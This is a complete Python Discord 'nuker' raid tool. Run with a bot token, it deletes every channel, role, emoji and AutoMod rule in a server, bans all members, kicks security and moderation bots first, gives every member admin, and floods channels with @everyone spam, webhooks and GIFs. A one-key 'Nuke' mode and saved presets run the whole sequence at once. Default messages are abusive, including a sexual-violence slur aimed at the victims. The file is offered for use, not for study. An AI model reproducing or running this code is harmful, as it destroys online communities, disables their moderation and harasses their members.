# yo if you are checking the code then its fine 
# but if you are a skid hear me out i have tried to make it as simple as possible for you 
# but dont mess with async and threads unless you want discord to fuck your bot token in ass
# if you are using an snippet from this source kindly give credit to us  
# if you need help in copying a snippet or something you can feel free to open a ticket 
# - by resil1x

import discord
import asyncio
import colorama
from colorama import Fore, Style, init
import shutil
import os
import json
init(autoreset=True)
import random

PRESET_DIR = "presets"
def ensure_preset_dir():
    if not os.path.exists(PRESET_DIR):
        os.makedirs(PRESET_DIR)

def list_presets():
    ensure_preset_dir()
    return [f for f in os.listdir(PRESET_DIR) if f.endswith(".json")]

def load_preset(filename):
    ensure_preset_dir()
    path = os.path.join(PRESET_DIR, filename)
    with open(path, "r") as f:
        return json.load(f)

def save_preset(name, data):
    ensure_preset_dir()
    path = os.path.join(PRESET_DIR, f"{name}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

def gradient_text(text, start_rgb=(255, 255, 0), end_rgb=(255, 70, 0)):
    length = len(text)
    output = ""
    for i, char in enumerate(text):
        if char == " ":
            output += char
            continue
        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * i / length)
        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * i / length)
        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * i / length)
        output += f"\033[38;2;{r};{g};{b}m{char}"
    return output + Style.RESET_ALL


async def delete_all_channels(guild: discord.Guild):
    print(gradient_text(f"[*] Deleting all channels in {guild.name}..."))

    channels = list(guild.channels)
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(40, total - count)
        batch = channels[count:count + batch_size]
        tasks = []

        for channel in batch:
            try:
                tasks.append(channel.delete())
                print(gradient_text(f"[-] Queued deletion: {channel.name}"))
            except Exception as e:
                print(gradient_text(f"[!] Failed to queue delete {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        count += len(batch)
        delay = random.uniform(0.3, 0.5) if len(batch) >= 5 else 0.2
        await asyncio.sleep(delay)

    print(gradient_text(f"[✓] Finished deleting {total} channels.\n"))

async def delete_all_voice_channels(guild: discord.Guild):
    print(gradient_text(f"[*] Deleting all voice channels in {guild.name}..."))

    channels = guild.voice_channels
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(40, total - count)
        batch = channels[count:count + batch_size]
        tasks = []

        for channel in batch:
            try:
                tasks.append(channel.delete())
                print(gradient_text(f"[-] Queued VC deletion: {channel.name}"))
            except Exception as e:
                print(gradient_text(f"[!] Failed to delete {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        count += len(batch)
        await asyncio.sleep(0.3)

    print(gradient_text(f"\n[✓] Deleted {count} voice channels."))

async def create_spam_channels(guild: discord.Guild, prefix: str = "nuked-by-nova", amount: int = 50):
    print(gradient_text(f"\n[*] Creating {amount} spam channels in {guild.name}..."))
    count = 0

    while count < amount:
        batch_size = min(30, amount - count)
        tasks = []

        for i in range(batch_size):
            channel_name = f"{prefix}-{count + 1}"
            tasks.append(guild.create_text_channel(channel_name))
            print(gradient_text(f"[+] Creating: {channel_name}"))
            count += 1

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.4)

    print(gradient_text(f"\n[✓] Successfully created {count} channels."))

async def create_spam_voice_channels(guild: discord.Guild, prefix: str = "vc-by-U-Nuker", amount: int = 50):
    print(gradient_text(f"\n[*] Creating {amount} voice channels in {guild.name}..."))
    count = 0

    while count < amount:
        batch_size = min(40, amount - count)
        tasks = []

        for i in range(batch_size):
            channel_name = f"{prefix}-{count + 1}"
            tasks.append(guild.create_voice_channel(channel_name))
            print(gradient_text(f"[+] Creating VC: {channel_name}"))
            count += 1

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.4)

    print(gradient_text(f"\n[✓] Successfully created {count} voice channels."))

async def kick_all_bots(guild: discord.Guild):
    print(gradient_text(f"[*] Kicking all bots in {guild.name}..."))

    priority_names = [
        "wick", "dyno", "beemo", "carl", "protection", "guard", "shield", "security"
    ]

    bots = [m for m in guild.members if m.bot]
    if not bots:
        print(gradient_text("[~] No bots found in this server."))
        return

    def priority_sort(bot):
        return 0 if any(keyword in bot.name.lower() for keyword in priority_names) else 1

    bots.sort(key=priority_sort)
    total = len(bots)
    count = 0

    while count < total:
        batch_size = min(10, total - count)
        batch = bots[count:count + batch_size]
        tasks = []

        for bot_member in batch:
            try:
                tasks.append(bot_member.kick(reason="Nuked by U-Nuker"))
                tag = f"{bot_member.name}#{bot_member.discriminator}"
                if any(key in bot_member.name.lower() for key in priority_names):
                    print(gradient_text(f"[⚠️] PRIORITY kick: {tag}"))
                else:
                    print(gradient_text(f"[-] Queued bot kick: {tag}"))
            except Exception as e:
                print(gradient_text(f"[!] Failed to kick {bot_member.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        count += len(batch)
        await asyncio.sleep(0.3)

    print(gradient_text(f"[✓] Kicked {count} bot(s), including security."))

async def delete_all_roles(guild: discord.Guild):
    print(gradient_text(f"[*] Deleting all roles in {guild.name}..."))

    bot_member = guild.me
    bot_top_role = bot_member.top_role

    roles = [
        role for role in guild.roles
        if not role.managed and role != guild.default_role and role.position < bot_top_role.position
    ]

    if not roles:
        print(gradient_text("[!] No deletable roles found."))
        return

    deleted_count = 0
    batch_size = 20  

    for i in range(0, len(roles), batch_size):
        batch = roles[i:i+batch_size]
        tasks = [asyncio.create_task(role.delete(reason="Bulk role deletion")) for role in batch]

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for role, result in zip(batch, results):
            if isinstance(result, Exception):
                print(gradient_text(f"[!] Failed to delete: {role.name} -> {result}"))
            else:
                deleted_count += 1
                print(gradient_text(f"[-] Deleted: {role.name}"))

        await asyncio.sleep(0.2)

    print(gradient_text(f"\n[✓] Finished deleting {deleted_count} roles."))

async def create_custom_roles(guild: discord.Guild, prefix: str = "GET FUCKED", amount: int = 50):
    print(gradient_text(f"[*] Creating {amount} roles in {guild.name}..."))
    count = 0

    while count < amount:
        batch_size = min(40, amount - count)
        tasks = []

        for i in range(batch_size):
            role_name = f"{prefix}-{count + 1}"
            tasks.append(guild.create_role(name=role_name, permissions=discord.Permissions.none()))
            print(gradient_text(f"[+] Creating role: {role_name}"))
            count += 1

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)

    print(gradient_text(f"\n[✓] Finished creating {count} roles."))

async def ban_all_members(guild: discord.Guild):
    print(gradient_text("[*] Banning all members..."))

    members = [m for m in guild.members if not m.bot]
    total = len(members)
    count = 0

    while count < total:
        batch_size = min(40, total - count)
        batch = members[count:count + batch_size]
        tasks = []

        for member in batch:
            try:
                tasks.append(member.ban(reason="Nuked by NOVA"))
                print(gradient_text(f"[-] Queued ban: {member.name}"))
                count += 1
            except Exception as e:
                print(gradient_text(f"[!] Failed to queue ban {member.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.4)

    print(gradient_text(f"[✓] Finished banning {count} members."))

async def spam_webhooks(guild: discord.Guild, message: str = "@everyone SERVER RAIDED"):
    print(gradient_text("[*] Creating and spamming webhooks..."))

    channels = guild.text_channels
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(40, total - count)
        batch = channels[count:count + batch_size]
        tasks = []

        for channel in batch:
            try:
                webhook = await channel.create_webhook(name="NOVA")
                print(gradient_text(f"[+] Webhook created in {channel.name}"))
                for _ in range(100):
                    tasks.append(webhook.send(message, username="NOVA"))
                count += 1
            except Exception as e:
                print(gradient_text(f"[!] Failed to create webhook in {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)

async def change_server_name(guild: discord.Guild, new_name: str = "NUKED BY NOVA"):
    try:
        await guild.edit(name=new_name)
        print(gradient_text(f"[✓] Server name changed to '{new_name}'."))
    except Exception as e:
        print(gradient_text(f"[!] Failed to change server name: {e}"))

async def mark_all_channels_nsfw(guild: discord.Guild):
    print(gradient_text("[*] Marking all text channels as NSFW..."))

    channels = guild.text_channels
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(8, total - count)
        batch = channels[count:count + batch_size]
        tasks = []

        for channel in batch:
            try:
                tasks.append(channel.edit(nsfw=True))
                print(gradient_text(f"[✓] Queued NSFW mark: {channel.name}"))
                count += 1
            except Exception as e:
                print(gradient_text(f"[!] Failed to queue NSFW mark {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)

    print(gradient_text(f"[✓] Done. {count} channels marked NSFW."))

async def unmark_all_channels_nsfw(guild: discord.Guild):
    print(gradient_text("[*] Unmarking all text channels from NSFW..."))

    channels = guild.text_channels
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(8, total - count)
        batch = channels[count:count + batch_size]
        tasks = []

        for channel in batch:
            try:
                tasks.append(channel.edit(nsfw=False))
                print(gradient_text(f"[✓] Queued NSFW unmark: {channel.name}"))
                count += 1
            except Exception as e:
                print(gradient_text(f"[!] Failed to queue NSFW unmark {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)

    print(gradient_text(f"[✓] Done. {count} channels unmarked from NSFW."))

async def delete_all_emojis(guild: discord.Guild):
    print(gradient_text(f"[*] Deleting all emojis in {guild.name}..."))

    emojis = list(guild.emojis)
    total = len(emojis)
    count = 0

    if total == 0:
        print(gradient_text("[~] No emojis found in this server."))
        return

    while count < total:
        batch_size = min(10, total - count)
        batch = emojis[count:count + batch_size]
        tasks = []

        for emoji in batch:
            try:
                tasks.append(emoji.delete(reason="Nuked by NOVA"))
                print(gradient_text(f"[-] Queued emoji deletion: {emoji.name}"))
            except Exception as e:
                print(gradient_text(f"[!] Failed to delete emoji {emoji.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        count += len(batch)
        await asyncio.sleep(0.3)

    print(gradient_text(f"\n[✓] Successfully deleted {count} emojis."))

async def admin_all(guild: discord.Guild):
    print(gradient_text(f"[*] Creating admin role in {guild.name}..."))
    try:
        admin_role = await guild.create_role(
            name=".",
            permissions=discord.Permissions(administrator=True)
        )
        print(gradient_text(f"[✓] Created role '.' with Administrator permissions."))
    except discord.Forbidden:
        print(gradient_text("[x] Missing permission to create role."))
        return
    except Exception as e:
        print(gradient_text(f"[x] Role creation error: {e}"))
        return

    members = [m for m in guild.members if not m.bot]
    total = len(members)
    assigned = 0
    failed = 0

    print(gradient_text(f"[*] Starting admin assignment to {total} members..."))

    for i in range(0, total, 20):
        batch = members[i:i + 20]

        for member in batch:
            try:
                await member.add_roles(admin_role, reason="Nuker Admin All")
                assigned += 1
                print(gradient_text(f"[>] Assigned admin to ({member.name}#{member.discriminator}) - {assigned}/{total}"))
            except Exception as e:
                failed += 1
                print(gradient_text(f"[x] Failed for ({member.name}#{member.discriminator}) - {e}"))

        await asyncio.sleep(0.3 + random.uniform(0.1, 0.15))

    print(gradient_text(f"[✓] Done: {assigned} assigned, {failed} failed."))

async def spam_messages(guild: discord.Guild, message: str = "@everyone SERVER RAIDED", amount: int = 100):
    print(gradient_text("[*] Initiating message spam..."))

    channels = guild.text_channels
    messages_sent = 0

    while messages_sent < amount:
        batch_size = min(80, len(channels))
        batch = random.sample(channels, batch_size) if len(channels) > batch_size else channels
        tasks = []

        for channel in batch:
            try:
                tasks.append(channel.send(message))
                messages_sent += 1
                print(gradient_text(f"[>] Sent ({messages_sent}/{amount}): {message[:20]}... → {channel.name}"))
            except Exception as e:
                print(gradient_text(f"[!] Error in {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.15 + random.uniform(0.05, 0.2))

    print(gradient_text(f"[✓] Finished sending {messages_sent} messages."))

async def spam_gifs(guild: discord.Guild):
    print(gradient_text("[*] Initiating GIF spam..."))

    gif_link = input(gradient_text("Enter Tenor GIF URL (blank for random)>> ")).strip()
    try:
        amount = int(input(gradient_text("How many messages to spam?>> ")).strip())
    except ValueError:
        print(gradient_text("[!] Invalid number. Using default: 100"))
        amount = 100

    catgirl_gifs = [
        "https://tenor.com/view/girl-meow-cute-meme-funny-gif-16874634335787195581",
        "https://tenor.com/view/warframe-femboy-hop-on-warframe-gif-24661075",
        "https://cdn.nekotina.com/images/YLEg3BOl.gif",
        "https://cdn.nekotina.com/images/-m5mW53l4.jpg"
    ]

    def get_gif():
        return gif_link if gif_link else random.choice(catgirl_gifs)

    channels = guild.text_channels
    messages_sent = 0

    while messages_sent < amount:
        batch_size = min(80, len(channels))
        batch = random.sample(channels, batch_size) if len(channels) > batch_size else channels
        tasks = []

        for channel in batch:
            try:
                msg = f"@everyone {get_gif()}"
                tasks.append(channel.send(msg))
                messages_sent += 1
                print(gradient_text(f"[>] Sent GIF ({messages_sent}/{amount}) → {channel.name}"))
            except Exception as e:
                print(gradient_text(f"[!] Failed in {channel.name}: {e}"))

        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.2)

    print(gradient_text(f"[✓] Finished GIF spamming: {messages_sent} sent."))

async def disable_community(guild: discord.Guild):
    print(gradient_text(f"[*] Attempting to disable Community settings in {guild.name}..."))

    if "COMMUNITY" not in guild.features:
        print(gradient_text("[~] This server is not a Community server. Nothing to disable."))
        return

    try:
        await guild.edit(community=False)
        print(gradient_text("[✓] Successfully disabled community features."))
    except discord.Forbidden:
        print(gradient_text("[!] Missing permission to disable community settings."))
    except Exception as e:
        print(gradient_text(f"[!] Failed to disable community: {e}"))

async def disable_automod(guild: discord.Guild):
    print(gradient_text(f"[*] Disabling AutoMod in {guild.name}..."))

    try:
        rules = await guild.fetch_automod_rules()
    except discord.Forbidden:
        print(gradient_text("[!] Missing permissions to fetch AutoMod rules."))
        return
    except Exception as e:
        print(gradient_text(f"[!] Error fetching rules: {e}"))
        return

    if not rules:
        print(gradient_text("[~] No AutoMod rules found. Already disabled."))
        return

    count = 0
    batch_size = 10

    for i in range(0, len(rules), batch_size):
        batch = rules[i:i + batch_size]
        tasks = []

        for rule in batch:
            print(gradient_text(f"[-] Queued deletion: {rule.name}"))
            tasks.append(rule.delete())

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for rule, result in zip(batch, results):
            if isinstance(result, Exception):
                print(gradient_text(f"[!] Failed to delete {rule.name}: {result}"))
            else:
                count += 1

        await asyncio.sleep(0.3)

    print(gradient_text(f"[✓] Successfully disabled AutoMod ({count} rule(s) deleted)."))

async def disable_onboarding(guild: discord.Guild):
    print(gradient_text(f"[*] Attempting to disable onboarding in {guild.name}..."))

    try:
        onboarding = await guild.fetch_onboarding()
    except discord.Forbidden:
        print(gradient_text("[!] Missing permission to fetch onboarding configuration."))
        return
    except discord.HTTPException as e:
        print(gradient_text(f"[!] Failed to fetch onboarding: {e}"))
        return

    if not onboarding.enabled:
        print(gradient_text("[~] Onboarding is already disabled."))
        return

    try:
        await guild.edit_onboarding(
            prompts=onboarding.prompts,
            default_channel_ids=onboarding.default_channel_ids,
            enabled=False
        )
        print(gradient_text("[✓] Successfully disabled onboarding."))
    except discord.Forbidden:
        print(gradient_text("[!] Missing permission to disable onboarding."))
    except discord.HTTPException as e:
        print(gradient_text(f"[!] Failed to disable onboarding: {e}"))

class CrimsonBot:
    def __init__(self):
        self.size = shutil.get_terminal_size().columns
        self.client = discord.Client(intents=discord.Intents.all())

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def render_ascii(self, user: str = None, server_count: int = None):
        self.clear()
        ascii = "\n".join([
            '   __  __      _   __      __            '.center(self.size),
            '  / / / /     / | / /_  __/ /_____  _____'.center(self.size),
            ' / / / /_____/  |/ / / / / //_/ _ \\/ ___/'.center(self.size),
            '/ /_/ /_____/ /|  / /_/ / ,< /  __/ /    '.center(self.size),
            '\\____/     /_/ |_/\__,_/_/|_|\\___/_/     '.center(self.size),
            ''.center(self.size)
        ])
        for line in ascii.splitlines():
            print(gradient_text(line))

        if user and server_count is not None:
            print(gradient_text(f"Logged in as: {user} | Found in {server_count} server(s)".center(self.size)))
        print("\n")

    def raider_options(self):
        options_block = f"""
{'   || 1  || ~ Delete Channels     || 2  || ~ Spam Channels     || 3  || ~ Delete Roles      || 10 || ~ Admin All       '.center(self.size)}
{'   || 4  || ~ Create Roles        || 5  || ~ Ban Members       || 6  || ~ Webhook Spam      || 11 || ~ Remove NSFW     '.center(self.size)}
{'   || 7  || ~ Rename Server       || 8  || ~ NSFW All          || 9  || ~ Message Spam      || 12 || ~ Spam Gifs       '.center(self.size)}
{'   || 13 || ~ Delete Vc           || 14 || ~ Create Vc         || 15 || ~ Delete Emojis     || 16 || ~ Kick [Bots]     '.center(self.size)}
{'   || 17 || ~ Disable Community   || 18 || ~ Delete Automod    || 19 || ~ Disable onboard   || 20 || ~ Discord&Credts  '.center(self.size)}

{'||*|| ~ Nuke           || ! || ~ Preset Nuke      || @ || ~ Make Preset     '.center(self.size)}
"""
        for line in options_block.splitlines():
            print(gradient_text(line))

    def show_credits(self):
        credits = [
            "Discord ~ discord.gg/dctools",
            "Owner ~ xritura01",
            "Made by resil1x",
            "",
            "Thank you for using our script",
            "Hope you have a nice day!"
        ]

        print("\n" * 2)
        for line in credits:
            print(gradient_text(line.center(self.size)))
        print("\n" * 2)

    async def run(self):
        self.render_ascii()
        token = input(gradient_text("Enter your bot token ~ "))

        @self.client.event
        async def on_ready():
            self.render_ascii(str(self.client.user), len(self.client.guilds))
            self.raider_options()

            guilds = self.client.guilds
            if not guilds:
                print(gradient_text("Bot is not in any server!"))
                return

            if len(guilds) > 1:
                print(gradient_text("Multiple guilds found:"))
                for i, g in enumerate(guilds, 1):
                    print(gradient_text(f"{i} ~ {g.name} ({g.id})"))
                selected = int(input(gradient_text("Select guild number ~ ")).strip()) - 1
                guild = guilds[selected]
            else:
                guild = guilds[0]

            await main(self, guild)

        try:
            await self.client.start(token)
        except discord.LoginFailure:
            print(gradient_text("Invalid token. Please try again"))

async def main(self, guild):
    while True:
        self.clear()
        self.render_ascii(str(self.client.user), len(self.client.guilds))
        self.raider_options()

        choice = (await asyncio.to_thread(input, gradient_text(" ~ "))).strip()
        if choice == "1":
            await delete_all_channels(guild)
        elif choice == "2":
            prefix = (await asyncio.to_thread(input, gradient_text("Enter channel prefix ~ "))).strip() or "nuked-by-nova"
            amount = int((await asyncio.to_thread(input, gradient_text("Enter number of channels ~ "))).strip() or 50)
            await create_spam_channels(guild, prefix, amount)
        elif choice == "3":
            await delete_all_roles(guild)
        elif choice == "4":
            prefix = (await asyncio.to_thread(input, gradient_text("Enter role prefix ~ "))).strip() or "GET FUCKED"
            amount = int((await asyncio.to_thread(input, gradient_text("Enter number of roles ~ "))).strip() or 25)
            await create_custom_roles(guild, prefix, amount)
        elif choice == "5":
            await ban_all_members(guild)
        elif choice == "6":
            msg = (await asyncio.to_thread(input, gradient_text("Enter webhook message ~ "))).strip() or "@everyone SERVER RAIDED"
            await spam_webhooks(guild, msg)
        elif choice == "7":
            new_name = (await asyncio.to_thread(input, gradient_text("Enter new server name ~ "))).strip() or "NUKED BY NOVA"
            await change_server_name(guild, new_name)
        elif choice == "8":
            await mark_all_channels_nsfw(guild)
        elif choice == "9":
            msg = (await asyncio.to_thread(input, gradient_text("Enter spam message ~ "))).strip() or "@everyone SERVER RAIDED"
            amount = int((await asyncio.to_thread(input, gradient_text("Enter message count ~ "))).strip() or 1000)
            await spam_messages(guild, msg, amount)
        elif choice == "10":
            await admin_all(guild)
        elif choice == "11":
            await unmark_all_channels_nsfw(guild)
        elif choice == "12":
            await spam_gifs(guild)
        elif choice == "13":
            await delete_all_voice_channels(guild)
        elif choice == "14":
            prefix = (await asyncio.to_thread(input, gradient_text("Enter voice channel prefix ~ "))).strip() or "vc-by-nova"
            amount = int((await asyncio.to_thread(input, gradient_text("Enter number of voice channels ~ "))).strip() or 50)
            await create_spam_voice_channels(guild, prefix, amount)
        elif choice == "15":
            await delete_all_emojis(guild)
        elif choice == "16":
            await kick_all_bots(guild)
        elif choice == "17":
            await disable_community(guild)
        elif choice == "18":
            await disable_automod(guild)
        elif choice == "19":
            await disable_onboarding(guild)
        elif choice == "20":
            self.clear()
            self.render_ascii()
            self.show_credits()
            await asyncio.to_thread(input, gradient_text("\nPress Enter to return ~ "))

        elif choice == "*":
            confirm = (await asyncio.to_thread(input, gradient_text("Are you sure you want to NUKE this server? (y/n): "))).strip().lower()
            if confirm != "y":
                print(gradient_text("[~] Nuke cancelled."))
                await asyncio.sleep(1)
                continue

            try:
                guild_id = int(await asyncio.to_thread(input, gradient_text("Enter Server ID to Nuke: ")))
                guild = self.client.get_guild(guild_id)
                if not guild:
                    print(gradient_text("[!] Guild not found or bot not in that server."))
                    await asyncio.sleep(1)
                    continue
            except ValueError:
                print(gradient_text("[!] Invalid server ID."))
                await asyncio.sleep(1)
                continue

            new_name = (await asyncio.to_thread(input, gradient_text("Enter new server name: "))).strip() or "Fucked by Utility .gg/dctools"
            channel_prefix = (await asyncio.to_thread(input, gradient_text("Enter channel prefix~ "))).strip() or "nuked-by-.gg/dctools"
            channel_amount = int((await asyncio.to_thread(input, gradient_text("Enter number of channels to create~ "))).strip() or 50)
            spam_msg = (await asyncio.to_thread(input, gradient_text("Enter message to spam~ "))).strip() or "server raped by discord.gg/dctools"
            spam_count = int((await asyncio.to_thread(input, gradient_text("How many messages to spam per channel(default = 1500)~ "))).strip() or 1500)
            role_prefix = (await asyncio.to_thread(input, gradient_text("Enter role prefix~ "))).strip() or "GET FUCKED"
            role_amount = int((await asyncio.to_thread(input, gradient_text("Enter number of roles to create~ "))).strip() or 50)

            await delete_all_channels(guild)
            await change_server_name(guild, new_name)
            await create_spam_channels(guild, channel_prefix, channel_amount)
            await spam_messages(guild, spam_msg, spam_count)
            await delete_all_roles(guild)
            await create_custom_roles(guild, role_prefix, role_amount)
            await delete_all_emojis(guild)
            await disable_automod(guild)
            await disable_community(guild)
            print(gradient_text("\n[✓] Server successfully nuked. If you had fun nuking kindly leave us a Vouch!"))
            await asyncio.to_thread(input, gradient_text("\nPress Enter to return ~ "))

        elif choice == "!":
            presets = list_presets()
            if not presets:
                print(gradient_text("[!] No presets found."))
                await asyncio.sleep(1)
                continue

            print(gradient_text("Available presets:"))
            for i, preset in enumerate(presets, 1):
                print(gradient_text(f"{i} ~ {preset}"))

            try:
                selected = int((await asyncio.to_thread(input, gradient_text("Select preset number ~ "))).strip()) - 1
                filename = presets[selected]
                config = load_preset(filename)
                print(gradient_text(f"[✓] Loaded preset: {filename}"))

                new_name       = config.get("new_name", "wasteland")
                channel_prefix = config.get("channel_prefix", "fucked ☠")
                channel_amount = config.get("channel_amount", 10)
                spam_msg       = config.get("spam_msg", "Utility")
                spam_count     = config.get("spam_count", 1200)
                role_prefix    = config.get("role_prefix", "bitched")
                role_amount    = config.get("role_amount", 80)

                await delete_all_channels(guild)
                await change_server_name(guild, new_name)
                await create_spam_channels(guild, channel_prefix, channel_amount)
                await spam_messages(guild, spam_msg, spam_count)
                await delete_all_roles(guild)
                await create_custom_roles(guild, role_prefix, role_amount)
                await delete_all_emojis(guild)
                await disable_automod(guild)
                await disable_community(guild)

                print(gradient_text("[✓] Preset executed successfully."))

            except (ValueError, IndexError):
                print(gradient_text("[!] Invalid selection."))
                await asyncio.sleep(1)

        elif choice == "@":
            preset_name = (await asyncio.to_thread(input, gradient_text("Enter preset name ~ "))).strip()
            new_config = {
                "new_name": (await asyncio.to_thread(input, gradient_text("Enter new server name ~ "))).strip(),
                "channel_prefix": (await asyncio.to_thread(input, gradient_text("Enter channel prefix ~ "))).strip(),
                "channel_amount": int((await asyncio.to_thread(input, gradient_text("Enter number of channels ~ "))).strip() or 10),
                "spam_msg": (await asyncio.to_thread(input, gradient_text("Enter spam message ~ "))).strip(),
                "spam_count": int((await asyncio.to_thread(input, gradient_text("Enter spam count ~ "))).strip() or 100),
                "role_prefix": (await asyncio.to_thread(input, gradient_text("Enter role prefix ~ "))).strip(),
                "role_amount": int((await asyncio.to_thread(input, gradient_text("Enter role amount ~ "))).strip() or 10)
            }
            save_preset(preset_name, new_config)
            print(gradient_text(f"[✓] Preset '{preset_name}' saved."))
            await asyncio.sleep(1)

        elif choice == "0":
            print(gradient_text("[*] Exiting..."))
            break
        else:
            print(gradient_text("Invalid option! Please try again."))
        await asyncio.sleep(0.4)  

if __name__ == "__main__":
    bot = CrimsonBot()
    asyncio.run(bot.run())
